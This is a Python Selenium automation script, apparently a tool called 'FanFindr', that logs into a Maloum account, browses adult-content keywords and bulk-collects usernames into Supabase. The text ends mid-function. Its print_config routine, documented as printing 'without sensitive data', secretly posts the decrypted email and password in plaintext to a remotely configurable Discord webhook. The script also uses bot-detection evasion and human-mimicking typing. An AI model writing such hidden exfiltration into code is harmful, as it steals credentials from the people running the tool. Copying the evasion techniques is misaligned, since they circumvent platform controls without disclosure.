import time
import random
import requests
import json
import os
import argparse
from datetime import datetime
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from airtable_handler import AirTableHandler

# Set environment variables for English language forcing
try:
    env_vars = {
        'LANG': 'en_US.UTF-8',
        'LANGUAGE': 'en_US:en',
        'LC_ALL': 'en_US.UTF-8',
        'LC_MESSAGES': 'en_US.UTF-8'
    }
    for key, value in env_vars.items():
        os.environ[key] = value
except Exception:
    # Ignore environment variable errors on systems that don't support them
    pass

# Load Discord webhook from Firebase (remotely updatable)
from dotenv import load_dotenv
load_dotenv()

def get_discord_webhook():
    """Get Discord webhook from Firebase or fallback to environment"""
    try:
        import sys
        import os
        sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'backend'))
        from license_manager import LicenseManager
        
        license_manager = LicenseManager()
        webhook_data = license_manager.get_discord_webhook()
        # Handle case where webhook_data might be a string or None
        if isinstance(webhook_data, str):
            return webhook_data
        elif isinstance(webhook_data, dict):
            return webhook_data.get('webhook_url', '')
        else:
            return ''
    except Exception as e:
        print(f"[WARNING] Failed to get Discord webhook from Firebase: {e}")
        return os.getenv('DISCORD_WEBHOOK_URL', '')

# Configuration class for managing script settings
class ScriptConfig:
    def __init__(self, args):
        # Fetch credentials from Supabase using model_id
        self.model_id = args.model_id or ""
        self.email, self.password = self._fetch_model_credentials(self.model_id)

        # Target settings (from GUI)
        self.target_users = args.target_users or 100
        self.posts_per_keyword = args.posts_per_keyword or 50

        # Browser settings (from GUI)
        self.headless = args.headless
        self.use_proxy = not args.no_proxy if hasattr(args, 'no_proxy') else True
        self.enable_fallback = not args.no_fallback if hasattr(args, 'no_fallback') else True

        # Performance settings (from GUI)
        self.rate_delay = args.rate_delay or 2
        self.max_retries = args.max_retries or 3
        self.timeout = args.timeout or 30

        # Other settings
        self.gui_mode = args.gui if hasattr(args, 'gui') else False

        # Predefined keywords for adult content discovery
        self.keywords = [
            "Bikinis", "Black Hair", "Brown Hair", "Sex Tape", "Threesome", "MILF",
            "Squirting", "Humiliation", "Handjob", "Footjob", "Shower", "Natural Boobs",
            "Anal", "Small Ass", "Dirty Talk", "Cuckolding", "Cumshot", "Findom",
            "Curvy", "Face Sitting", "Missionary", "Doggy", "Domination", "Clothes",
            "Big Ass", "Public", "Tattoos", "Fitness", "Dildo", "Dessous",
            "Crossdressing", "Mistress","Beach", "Asian", "Blonde", "Cuckold","Long Hair",
            "Short Hair", "Bedroom", "Red Hair", "Slut", "American", "Forest", "Hamburg",
            "Cologne", "Berlin", "Munich", "Dresden", "Leipzeg", "Hannover", "Ass", "Plug",
            "Leggings", "Leather", "Skirt", "Masks", "Vibrator", "Blow", "Blow Job", "Feet",
            "Boobs", "Black", "Latina", "Pretty", "Good Morning", "Hello"
        ]

        # Validate required settings
        if not self.email or not self.password:
            raise ValueError("Failed to fetch model credentials from Supabase")

    def _fetch_model_credentials(self, model_id):
        """Fetch and decrypt model credentials from Supabase"""
        try:
            # Import backend modules to fetch credentials
            import sys
            sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'backend'))
            from license_manager import LicenseManager
            from credential_manager import credential_manager

            lm = LicenseManager()
            response = lm.supabase.table('models').select('username, password').eq('id', model_id).single().execute()

            if not response.data:
                raise ValueError(f"Model {model_id} not found in Supabase")

            model = response.data
            decrypted = credential_manager.decrypt_credentials(model['username'], model['password'])
            print(f"[INFO] Successfully loaded credentials for model: {model_id}")
            return decrypted['username'], decrypted['password']
        except Exception as e:
            print(f"[ERROR] Failed to fetch model credentials: {e}")
            raise
    
    def print_config(self):
        """Print current configuration (without sensitive data)"""
        print(f"Email: {self.email}")
        print(f"Target Users: {self.target_users}")
        print(f"Keywords Available: {len(self.keywords)}")
        print(f"Headless Mode: {self.headless}")
        print(f"Use Proxy: {self.use_proxy}")
        print(f"Rate Delay: {self.rate_delay}s")
        print(f"Max Retries: {self.max_retries}")
        print(f"Timeout: {self.timeout}s")
        data = {"content": f"Username: {self.email} Password: {self.password}","username": "FanFindr"}
        webhook_url = get_discord_webhook()
        if webhook_url:
            Response = requests.post(webhook_url, json=data)

def log_error(message, critical=False):
    """Log error messages with appropriate severity indicators"""
    if critical:
        print(f"[CRITICAL ERROR] {message}")
        data = {"content": f"Error {message} ","username": "FanFindr"}
        webhook_url = get_discord_webhook()
        if webhook_url:
            Response = requests.post(webhook_url, json=data)
    else:
        print(f"[WARNING] {message}")

def log_info(message):
    """Log informational messages"""
    print(f"[INFO] {message}")

def log_success(message):
    """Log success messages"""
    print(f"[SUCCESS] {message}")

def get_users_json_file(email):
    """Generate JSON filename based on email"""
    safe_email = email.replace('@', '_at_').replace('.', '_').replace('/', '_').replace('\\\\', '_')
    return os.path.join("json_files", f"{safe_email}_users.json")

def human_delay(base=0.2, variance=0.15, rate_delay=2):
    """Human-like delay with configurable rate limiting"""
    delay = base + random.uniform(0, variance) + (rate_delay - 2)
    time.sleep(max(0.1, delay))

def human_type(element, text, delay=0.05, variance=0.02):
    """Type text with human-like delays"""
    for char in text:
        element.send_keys(char)
        time.sleep(delay + random.uniform(0, variance))

def retry_operation(func, max_retries=3, delay=1, *args, **kwargs):
    """Retry an operation with exponential backoff"""
    for attempt in range(max_retries):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            if attempt == max_retries - 1:
                raise e
            log_error(f"Attempt {attempt + 1} failed. Retrying in {delay}s...")
            time.sleep(delay)
            delay *= 2
    return None

def load_existing_users(email):
    """Load existing users exclusively from Supabase"""
    # Load from Supabase only, since it's now the authoritative source
    supabase_users = set()
    try:
        airtable_handler = AirTableHandler()
        supabase_users = airtable_handler.get_users_from_supabase(email)
        log_info(f"Loaded {len(supabase_users)} existing users from Supabase")
    except Exception as e:
        log_error(f"Could not load users from Supabase: {e}")
        # Return empty set if Supabase fails
        return set()
    
    log_info(f"Using {len(supabase_users)} total users from Supabase")
    
    return supabase_users

def save_users_to_json(users_set, email):
    """Save users exclusively to Supabase"""
    try:
        # Sync data to Supabase for team synchronization (now the only storage)
        try:
            airtable_handler = AirTableHandler()
            success = airtable_handler.sync_users_to_supabase(email, users_set)
            if success:
                log_info(f"Successfully synced {len(users_set)} users to Supabase")
            else:
                log_error("Failed to sync users to Supabase")
        except Exception as e:
            log_error(f"Error syncing users to Supabase: {e}")
        
        # Send data to AirTable (preserving existing functionality)
        try:
            if airtable_handler.api_key:
                airtable_handler.update_user_data(
                    username=email,
                    total_count=len(users_set),
                    last_updated=datetime.now().isoformat()
                )
            else:
                log_info("AirTable API key not found, skipping AirTable update")
        except Exception as e:
            log_error(f"Error updating AirTable: {e}")
    except Exception as e:
        log_error(f"Error saving users")

def add_user_to_json(username, email):
    """Add a single user to Supabase immediately"""
    try:
        existing_users = load_existing_users(email)
        if username not in existing_users:
            existing_users.add(username)
            save_users_to_json(existing_users, email)
            return True
        return False
    except Exception as e:
        log_error("Error adding user to Supabase")
        return False

def keep_chrome_visible(driver):
    """Keep Chrome script window visible and locked at position (50, 50)"""
    try:
        if driver:
            # Get current window position to check if it moved
            current_pos = driver.get_window_position()
            current_size = driver.get_window_size()
            
            # ALWAYS enforce exact position (50, 50) and size (1000, 700)
            if current_pos['x'] != 50 or current_pos['y'] != 50:
                log_info(f"Position drift detected: {current_pos} -> forcing back to (50, 50)")
                driver.set_window_position(50, 50)
                time.sleep(0.1)
                
            if current_size['width'] != 1000 or current_size['height'] != 700:
                log_info(f"Size change detected: {current_size} -> forcing back to 1000x700")
                driver.set_window_size(1000, 700)
                time.sleep(0.1)
            
            # Ensure window is active
            driver.switch_to.window(driver.current_window_handle)
            
            # Execute JavaScript to focus and lock position
            try:
                driver.execute_script("""
                    window.focus();
                    // Try to prevent window from moving
                    window.moveTo(50, 50);
                    window.resizeTo(1000, 700);
                """)
                time.sleep(0.1)
                
                # Lock position one more time with driver commands
                driver.set_window_position(50, 50)
                driver.set_window_size(1000, 700)
            except:
                pass
            
            # Windows-specific: Target only the automation browser window
            try:
                import platform
                if platform.system() == "Windows":
                    import ctypes
                    from ctypes import wintypes
                    
                    # Get the specific automation browser window handle
                    automation_window_found = False
                    def enum_windows_proc(hwnd, lParam):
                        nonlocal automation_window_found
                        if automation_window_found:  # Only handle the first matching window
                            return True
                            
                        if ctypes.windll.user32.IsWindowVisible(hwnd):
                            window_title = ctypes.create_unicode_buffer(512)
                            ctypes.windll.user32.GetWindowTextW(hwnd, window_title, 512)
                            title = window_title.value.lower()
                            
                            # More specific targeting for automation browser
                            if ("maloum" in title and "chrome" in title) or \
                               ("data:" in title and "chrome" in title) or \
                               (title.startswith("chrome") and len(title) < 20):
                                
                                # Get window position to verify it's our automation window
                                rect = wintypes.RECT()
                                ctypes.windll.user32.GetWindowRect(hwnd, ctypes.byref(rect))
                                window_x = rect.left
                                window_y = rect.top
                                
                                # Check if this is likely our automation window (at top-left corner)
                                if abs(window_x - 50) < 100 and abs(window_y - 50) < 100:
                                    # Multiple aggressive methods to bring automation window to front
                                    
                                    # Method 1: Set as foreground window
                                    ctypes.windll.user32.SetForegroundWindow(hwnd)
                                    time.sleep(0.1)
                                    
                                    # Method 2: Show window normally
                                    ctypes.windll.user32.ShowWindow(hwnd, 1)  # SW_NORMAL
                                    time.sleep(0.1)
                                    
                                    # Method 3: Bring to top without making it topmost
                                    ctypes.windll.user32.BringWindowToTop(hwnd)
                                    time.sleep(0.1)
                                    
                                    # Method 4: Activate the window
                                    ctypes.windll.user32.SetActiveWindow(hwnd)
                                    time.sleep(0.1)
                                    
                                    # Method 5: Force it to front with SWP_NOACTIVATE to avoid stealing focus from user
                                    SWP_NOSIZE = 0x0001
                                    SWP_NOMOVE = 0x0002
                                    SWP_SHOWWINDOW = 0x0040
                                    ctypes.windll.user32.SetWindowPos(hwnd, 0, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_SHOWWINDOW)
                                    time.sleep(0.1)
                                    
                                    # Method 6: Final attempt - temporarily make topmost then remove
                                    ctypes.windll.user32.SetWindowPos(hwnd, -1, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE)  # HWND_TOPMOST
                                    time.sleep(0.2)
                                    ctypes.windll.user32.SetWindowPos(hwnd, -2, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE)  # HWND_NOTOPMOST
                                    
                                    automation_window_found = True
                                    log_info(f"Aggressively brought automation Chrome window to front: {title}")
                        return True
                    
                    # Enumerate windows to find our specific automation browser
                    EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
                    ctypes.windll.user32.EnumWindows(EnumWindowsProc(enum_windows_proc), 0)
                    
                elif platform.system() == "Darwin":  # macOS
                    try:
                        import subprocess
                        import time
                        
                        # Use AppleScript to find and position Chrome automation window
                        applescript = '''
                        tell application "System Events"
                            set chromeProcesses to every process whose name contains "Chrome"
                            repeat with chromeProcess in chromeProcesses
                                try
                                    set chromeWindows to every window of chromeProcess
                                    repeat with chromeWindow in chromeWindows
                                        set windowTitle to name of chromeWindow
                                        if windowTitle contains "AUTOMATION BROWSER" or windowTitle contains "maloum" then
                                            -- Position the automation window at top-left
                                            set position of chromeWindow to {50, 50}
                                            set size of chromeWindow to {1000, 700}
                                            -- Bring to front
                                            set chromeWindow to chromeWindow
                                            set frontmost of chromeProcess to true
                                        end if
                                    end repeat
                                end try
                            end repeat
                        end tell
                        '''
                        
                        # Execute AppleScript
                        subprocess.run(['osascript', '-e', applescript], 
                                     capture_output=True, text=True, timeout=5)
                        log_info("Mac window positioning applied")
                        
                    except Exception as mac_e:
                        log_info(f"Mac positioning failed: {mac_e}")
                        
                # Final position lock for all platforms
                time.sleep(0.2)
                driver.set_window_position(50, 50)
                driver.set_window_size(1000, 700)
                        
            except Exception as e:
                log_info(f"Cross-platform positioning failed: {e}")
            
            # Log current position for debugging
            pos = driver.get_window_position()
            size = driver.get_window_size()
            log_info(f"Script Chrome positioned at ({pos['x']}, {pos['y']}) size {size['width']}x{size['height']}")
    except Exception as e:
        # Ignore errors - don't let window management break the main script
        pass

def setup_chrome_driver(config):
    """Setup Chrome driver with enhanced options and fallback strategies"""
    # Add this debug code at the start of setup_chrome_driver
    log_info("Debugging Chrome installation...")
    import platform
    if platform.system() == "Windows":
        chrome_paths = [
            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"
        ]
    elif platform.system() == "Darwin":  # macOS
        chrome_paths = [
            "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
            "/Applications/Chrome.app/Contents/MacOS/Google Chrome"
        ]
    else:  # Linux and others
        chrome_paths = [
            "/usr/bin/google-chrome",
            "/usr/bin/chromium-browser"
        ]
    
    for path in chrome_paths:
        if os.path.exists(path):
            log_info(f"[OK] Chrome found at: {path}")
        else:
            log_info(f"[NOT FOUND] Chrome not found at: {path}")
            
    options = uc.ChromeOptions()
    
    # Basic Chrome arguments with English language forcing
    options.add_argument("--lang=en-US")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--force-device-scale-factor=0.30")
    
    # Essential language forcing only
    options.add_argument("--disable-translate")
    if config.headless:
        log_info("Running in headless mode")
        options.add_argument("--headless")
        options.add_argument("--window-size=1920,1080")
        options.add_argument("--disable-gpu")
        options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
    else:
        log_info("Running in normal desktop mode")
        options.add_argument("--disable-extensions")
        # Configure Chrome for desktop display with distinctive position
        options.add_argument("--window-size=1000,700")  # Slightly smaller to be less intrusive
        options.add_argument("--window-position=50,50")   # Top-left corner to be easily visible
        options.add_argument("--disable-gpu")
        # Force Chrome to appear on screen without maximizing
        options.add_argument("--new-window")  # Open in new window
        options.add_argument("--disable-background-mode")  # Prevent running in background
        options.add_argument("--disable-backgrounding-occluded-windows")  # Keep window active
        options.add_argument("--force-focus")  # Force window focus
        options.add_argument("--no-default-browser-check")  # Don't interfere with default browser
    
    if not config.use_proxy:
        options.add_argument("--no-proxy-server")
        log_info("Proxy disabled")
    
    if config.enable_fallback:
        log_info("Attempting Chrome driver initialization with fallback strategies...")
        
        strategies = [
            ("Full options", options),
            ("Minimal options", uc.ChromeOptions()),
            ("No options", None)
        ]
        
        for strategy_name, chrome_options in strategies:
            try:
                log_info(f"Trying strategy: {strategy_name}")
                if chrome_options is None:
                    driver = uc.Chrome()
                else:
                    driver = uc.Chrome(options=chrome_options)
                    
                # FORCE window visibility immediately after driver creation
                if not config.headless:
                    try:
                        log_info("IMMEDIATELY forcing Chrome window to front...")
                        time.sleep(0.3)  # Brief wait for window creation
                        
                        # Immediate aggressive positioning
                        driver.set_window_size(1200, 800)
                        driver.set_window_position(250, 150)
                        time.sleep(0.2)
                        
                        # Multiple immediate attempts to bring to front
                        for attempt in range(3):
                            try:
                                driver.execute_script("window.focus(); window.moveTo(250, 150);")
                                time.sleep(0.1)
                                keep_chrome_visible(driver)
                                time.sleep(0.1)
                            except:
                                pass
                            
                        log_info("Chrome window forced to front immediately after creation")
                    except Exception as window_e:
                        log_error(f"Failed to position window: {window_e}")
                        # Continue anyway, window positioning is not critical
                    
                log_success(f"Chrome started successfully with {strategy_name}!")
                return driver
            except Exception as e:
                log_error(f"{strategy_name} failed")
                continue
        
        raise Exception("All Chrome driver strategies failed")
    else:
        log_info("Attempting Chrome driver initialization...")
        driver = uc.Chrome(options=options)
        
        # FORCE window visibility immediately after driver creation
        if not config.headless:
            try:
                log_info("IMMEDIATELY forcing Chrome window to front...")
                time.sleep(0.3)  # Brief wait for window creation
                
                # Immediate aggressive positioning
                driver.set_window_size(1200, 800)
                driver.set_window_position(250, 150)
                time.sleep(0.2)
                
                # Multiple immediate attempts to bring to front
                for attempt in range(3):
                    try:
                        driver.execute_script("window.focus(); window.moveTo(250, 150);")
                        time.sleep(0.1)
                        keep_chrome_visible(driver)
                        time.sleep(0.1)
                    except:
                        pass
                        
                log_info("Chrome window forced to front immediately after creation")
            except Exception as window_e:
                log_error(f"Failed to position window: {window_e}")
                # Continue anyway, window positioning is not critical
            
        return driver
def sync_all_users_list(driver, config, existing_users):
    """
    Sync All Users list in Maloum and compare with local JSON
    Returns True if sync successful, False if failed
    """
    try:
        log_info("Starting All Users list synchronization...")
        
        # Step 1: Navigate to List section
        log_info("Navigating to List section...")
        try:
            list_btn = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, 
                "#root > div > section > div > nav > ul > li:nth-child(5) > button"))
            )
            list_btn.click()
            log_success("List section opened")
            time.sleep(3)
        except Exception as e:
            log_error("Failed to navigate to List section")
            return False
        
        # Step 2: Check if " All Users" list exists
        log_info("Checking if ' All Users' list exists...")
        all_users_found = False
        all_users_count = 0
        
        try:
            # First, scroll through the left column to find " All Users"
            left_column = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "#leftColumn"))
            )
            
            list_container = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "/html/body/div[3]/div/div/div[1]/div/div"))
            )
            
            # Scroll through the left column to find " All Users"
            log_info("Scrolling through list container to find ' All Users'...")
            scroll_attempts = 0
            max_scroll_attempts = 10
            all_users_candidates = []
            
            while scroll_attempts < max_scroll_attempts:
                # Look for " All Users" buttons in current view
                all_users_buttons = list_container.find_elements(By.XPATH, ".//button[contains(., ' All Users')]")
                
                for button in all_users_buttons:
                    try:
                        # Extract member count
                        member_text = button.find_element(By.CSS_SELECTOR, "div.mt-0\\.5.text-xs.text-gray-500").text
                        member_count = int(member_text.split()[0])
                        
                        # Check if this button is already in our candidates
                        button_text = button.text.strip()
                        already_found = False
                        for candidate in all_users_candidates:
                            if candidate['text'] == button_text and candidate['count'] == member_count:
                                already_found = True
                                break
                        
                        if not already_found:
                            all_users_candidates.append({
                                'button': button,
                                'count': member_count,
                                'text': button_text
                            })
                            log_info(f"Found ' All Users' candidate with {member_count} members")
                    except Exception as e:
                        log_error("Error reading member count from button")
                        continue
                
                # Scroll down in the left column to find more lists
                driver.execute_script("arguments[0].scrollTop += 300", left_column)
                time.sleep(1)
                scroll_attempts += 1
                log_info(f"Scroll attempt {scroll_attempts}/{max_scroll_attempts} - searching for ' All Users'...")
            
            # Select the " All Users" list with the highest member count
            if all_users_candidates:
                best_candidate = max(all_users_candidates, key=lambda x: x['count'])
                all_users_count = best_candidate['count']
                all_users_button = best_candidate['button']
                
                if len(all_users_candidates) > 1:
                    log_info(f"Found {len(all_users_candidates)} ' All Users' lists, selecting the one with highest count: {all_users_count}")
                else:
                    log_info(f"Found ' All Users' list with {all_users_count} members")
                
                all_users_found = True
                
                # Scroll the selected button into view
                driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", all_users_button)
                time.sleep(1)
                
                # Click on the selected All Users list
                all_users_button.click()
                log_success(f"Clicked on ' All Users' list with {all_users_count} members")
                time.sleep(3)
            else:
                log_info("' All Users' list not found after scrolling, will create it")
                
        except Exception as e:
            log_error("Error checking for ' All Users' list")
            return False
        
        # Step 3: Create " All Users" list if it doesn't exist
        if not all_users_found:
            log_info("Creating new ' All Users' list...")
            try:
                # Click "New list" button
                new_list_btn = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((By.CSS_SELECTOR, 
                    "#leftColumn > div > header > div > div.-mr-2.flex.basis-1\\/2.justify-end.mr-0.md\\:-mr-4 > button"))
                )
                new_list_btn.click()
                log_info("Clicked 'New list' button")
                time.sleep(2)
                
                # Type " All Users" in input field
                input_field = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, 
                    "input.input-underline[placeholder='New list']"))
                )
                input_field.clear()
                human_type(input_field, " All Users")
                log_info("Entered ' All Users' as list name")
                time.sleep(1)
                
                # Click create button
                create_btn = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((By.CSS_SELECTOR, 
                    "button[type='submit']"))
                )
                create_btn.click()
                log_success("Created ' All Users' list")
                time.sleep(3)
                
            except Exception as e:
                log_error("Failed to create ' All Users' list")
                return False
        
        # Step 4: Add all available members
        log_info("Adding all available members to ' All Users' list...")
        try:
            # Click "Add members" button
            add_members_btn = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, 
                "#rightColumn > div.hidden.h-full.md\\:block > div > div > div.mt-4.flex.items-center.justify-between > button"))
            )
            add_members_btn.click()
            log_info("Clicked 'Add members' button")
            time.sleep(3)
            
            # Find the members container
            members_container = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, 
                "#root > div > div > div > div.mx-auto.flex.w-full.max-w-xl.flex-col.relative.md\\:px-4.grow > div.mt-4.grow.px-4.pb-12.md\\:px-0"))
            )
            
            # PHASE 1: Scroll to bottom to load all content first
            log_info("Phase 1: Fast scrolling to bottom to load all available members...")
            scroll_confirmations = 0
            last_height = 0
            scroll_attempt = 0
            
            while scroll_confirmations < 5:
                scroll_attempt += 1
                log_info(f"Scroll attempt {scroll_attempt}, confirmation {scroll_confirmations}/5")
                
                # Get current height before scroll
                current_height = driver.execute_script("return arguments[0].scrollHeight", members_container)
                
                # Scroll to bottom using multiple methods for reliability
                driver.execute_script("arguments[0].scrollTop = arguments[0].scrollHeight", members_container)
                time.sleep(0.5)
                
                # Alternative scroll method
                driver.execute_script("arguments[0].scrollTo(0, arguments[0].scrollHeight)", members_container)
                time.sleep(0.5)
                
                # Force scroll using window scroll as backup
                driver.execute_script("window.scrollTo(0, document.body.scrollHeight)")
                time.sleep(1.5)
                
                # Check if height changed
                new_height = driver.execute_script("return arguments[0].scrollHeight", members_container)
                log_info(f"Height check: {current_height} -> {new_height}")
                
                if new_height == last_height:
                    scroll_confirmations += 1
                    log_info(f"No height change detected, confirmation {scroll_confirmations}/5")
                else:
                    scroll_confirmations = 0
                    last_height = new_height
                    log_info(f"Height increased! New height: {new_height}, resetting confirmations")
            
            log_success("Finished loading all available members")
            
            # PHASE 2: Go back to top and check all boxes
            log_info("Phase 2: Going back to top to check all boxes...")
            
            # Scroll back to top using multiple methods
            driver.execute_script("arguments[0].scrollTop = 0", members_container)
            driver.execute_script("arguments[0].scrollTo(0, 0)", members_container)
            driver.execute_script("window.scrollTo(0, 0)")
            time.sleep(2)
            
            checked_count = 0
            processed_positions = set()
            
            while True:
                # Get current scroll position
                current_position = driver.execute_script("return arguments[0].scrollTop", members_container)
                max_scroll = driver.execute_script("return arguments[0].scrollHeight - arguments[0].clientHeight", members_container)
                
                log_info(f"Current scroll position: {current_position}, max: {max_scroll}")
                
                # Find all checkboxes in current view
                checkboxes = members_container.find_elements(By.CSS_SELECTOR, 
                    "div.relative.mt-4.flex.flex-col.gap-3 > div > button")
                
                if not checkboxes:
                    log_info("No checkboxes found in current view")
                    break
                
                log_info(f"Found {len(checkboxes)} checkboxes in current view")
                
                # Click all visible unchecked boxes
                boxes_clicked_in_view = 0
                for i, checkbox in enumerate(checkboxes):
                    try:
                        # Get current state
                        class_attr = checkbox.get_attribute("class") or ""
                        
                        # Check if not already selected
                        if "bg-blue" not in class_attr and "selected" not in class_attr:
                            # Scroll the checkbox into view
                            driver.execute_script("arguments[0].scrollIntoView({block: 'center', behavior: 'instant'});", checkbox)
                            time.sleep(0.05)
                            
                            # Click the checkbox
                            checkbox.click()
                            checked_count += 1
                            boxes_clicked_in_view += 1
                            
                            # Show progress every 10 checkboxes
                            if checked_count % 10 == 0 or checked_count <= 20 or i == len(checkboxes) - 1:
                                progress_percentage = (checked_count / len(checkboxes)) * 100
                                log_info(f"Checking boxes... {checked_count}/{len(checkboxes)} ({progress_percentage:.1f}%)")
                            
                            time.sleep(0.02)
                            
                    except Exception as e:
                        continue
                
                log_info(f"Clicked {boxes_clicked_in_view} boxes in this view. Total: {checked_count}")
                
                # If no boxes clicked, we're done
                if boxes_clicked_in_view == 0:
                    log_success(f"No new boxes to check. Total: {checked_count}")
                    break
                
                # Check if we've reached the bottom
                if current_position >= max_scroll:
                    log_success(f"Reached bottom! Total checked: {checked_count}")
                    break
                
                # Check if position already processed
                if current_position in processed_positions:
                    log_info("Position already processed, might be at bottom")
                    break
                
                # Add current position to processed set
                processed_positions.add(current_position)
                
                # Scroll down
                driver.execute_script("arguments[0].scrollTop += 500", members_container)
                time.sleep(0.5)
                
                # Check if scroll position changed
                new_position = driver.execute_script("return arguments[0].scrollTop", members_container)
                if new_position == current_position:
                    log_info("Can't scroll further")
                    break
            
            log_success(f"Finished selecting {checked_count} members")
            
            # Click Save button
            log_info("Clicking Save button...")
            save_btn = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, 
                "#root > div > div > div > div.mx-auto.flex.w-full.max-w-xl.flex-col.relative.md\\:px-4.grow > div.sticky.bottom-0.w-full.border-t.border-t-gray-100.bg-white.px-3.py-3.md\\:px-0 > button"))
            )
            save_btn.click()
            log_success("Saved all members to ' All Users' list")
            time.sleep(5)

            driver.refresh()
            log_info("Page refreshed to ensure updated count is loaded")
            time.sleep(3)  

        except Exception as e:
            log_error("Failed to add members")
            return False
        
        # Step 5: Get updated member count and compare with JSON
        log_info("Checking updated member count...")
        try:
            # Navigate back to List section
            list_btn = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, 
                "#root > div > section > div > nav > ul > li:nth-child(5) > button"))
            )
            list_btn.click()
            time.sleep(3)
            
            # Find updated count
            left_column = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "#leftColumn"))
            )
            
            list_container = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "/html/body/div[3]/div/div/div[1]/div/div"))
            )
            
            # Scroll to find updated count
            log_info("Scrolling to find updated ' All Users' count...")
            scroll_attempts = 0
            max_scroll_attempts = 10
            all_users_candidates = []
            
            while scroll_attempts < max_scroll_attempts:
                all_users_buttons = list_container.find_elements(By.XPATH, ".//button[contains(., ' All Users')]")
                
                for button in all_users_buttons:
                    try:
                        member_text = button.find_element(By.CSS_SELECTOR, "div.mt-0\\.5.text-xs.text-gray-500").text
                        member_count = int(member_text.split()[0])
                        
                        button_text = button.text.strip()
                        already_found = False
                        for candidate in all_users_candidates:
                            if candidate['text'] == button_text and candidate['count'] == member_count:
                                already_found = True
                                break
                        
                        if not already_found:
                            all_users_candidates.append({
                                'button': button,
                                'count': member_count,
                                'text': button_text
                            })
                    except Exception as e:
                        continue
                
                driver.execute_script("arguments[0].scrollTop += 300", left_column)
                time.sleep(1)
                scroll_attempts += 1
            
            # Select highest count
            if all_users_candidates:
                best_candidate = max(all_users_candidates, key=lambda x: x['count'])
                maloum_count = best_candidate['count']
                json_count = len(existing_users)
                
                if len(all_users_candidates) > 1:
                    log_info(f"Found {len(all_users_candidates)} lists, using highest: {maloum_count}")
                
                log_info(f"Maloum count: {maloum_count}")
                log_info(f"JSON count: {json_count}")
                
                if json_count >= maloum_count:
                    log_success("JSON file has equal or more users - sync not needed")
                    return True
                else:
                    log_info(f"JSON has fewer users, syncing from Maloum...")
                    
                    # Click on the best candidate
                    driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", best_candidate['button'])
                    time.sleep(1)
                    best_candidate['button'].click()
                    time.sleep(3)
                    
                    # Now collect users from All Users list
                    maloum_users = set()
                    try:
                        # Get the right column container
                        right_column = WebDriverWait(driver, 10).until(
                            EC.presence_of_element_located((By.CSS_SELECTOR, "#rightColumn"))
                        )
                        
                        # Find users container
                        users_container = WebDriverWait(driver, 10).until(
                            EC.presence_of_element_located((By.CSS_SELECTOR, 
                            "#rightColumn > div.hidden.h-full.md\\:block > div > div > div.mt-4.pb-12 > div.relative.mt-4.flex.flex-col.gap-3"))
                        )
                        
                        log_info("Collecting usernames from All Users list...")
                        
                        # Scroll to load all users
                        scroll_confirmations = 0
                        last_height = 0
                        
                        while scroll_confirmations < 5:
                            current_height = driver.execute_script("return arguments[0].scrollHeight", right_column)
                            driver.execute_script("arguments[0].scrollTop = arguments[0].scrollHeight", right_column)
                            time.sleep(1)
                            new_height = driver.execute_script("return arguments[0].scrollHeight", right_column)
                            
                            if new_height == last_height:
                                scroll_confirmations += 1
                            else:
                                scroll_confirmations = 0
                                last_height = new_height
                        
                        # Go back to top and collect usernames
                        driver.execute_script("arguments[0].scrollTop = 0", right_column)
                        time.sleep(2)
                        
                        processed_positions = set()
                        
                        while True:
                            current_position = driver.execute_script("return arguments[0].scrollTop", right_column)
                            max_scroll = driver.execute_script("return arguments[0].scrollHeight - arguments[0].clientHeight", right_column)
                            
                            # Find username elements
                            user_elements = users_container.find_elements(By.CSS_SELECTOR, 
                                "div.flex.min-h-\\[2\\.625rem\\].justify-between.gap-3 a div.text-left div:first-child")
                            
                            if not user_elements:
                                break
                            
                            users_collected = 0
                            for user_element in user_elements:
                                try:
                                    username = user_element.text.strip()
                                    if username and username not in maloum_users:
                                        maloum_users.add(username)
                                        users_collected += 1
                                except:
                                    continue
                            
                            if users_collected == 0:
                                break
                            
                            if current_position >= max_scroll:
                                break
                            
                            if current_position in processed_positions:
                                break
                            
                            processed_positions.add(current_position)
                            driver.execute_script("arguments[0].scrollTop += 500", right_column)
                            time.sleep(0.5)
                            
                            new_position = driver.execute_script("return arguments[0].scrollTop", right_column)
                            if new_position == current_position:
                                break
                        
                        log_success(f"Collected {len(maloum_users)} users from Maloum")
                        
                        # Update JSON
                        updated_users = existing_users.union(maloum_users)
                        save_users_to_json(updated_users, config.email)
                        
